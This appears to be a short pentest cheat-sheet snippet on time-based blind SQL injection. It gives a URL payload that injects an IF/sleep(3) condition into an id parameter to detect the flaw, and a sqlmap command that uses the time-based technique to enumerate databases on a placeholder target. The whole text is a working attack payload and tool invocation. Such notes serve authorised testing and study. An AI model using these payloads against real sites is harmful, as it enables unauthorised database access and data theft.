```
# Detection (3s delay = vulnerable):
http://target/page.php?id=1' AND IF(1=1,sleep(3),'false')-- -
sqlmap -u "http://<IP>/page.php?id=1" --technique=T --level=3 --dbs
```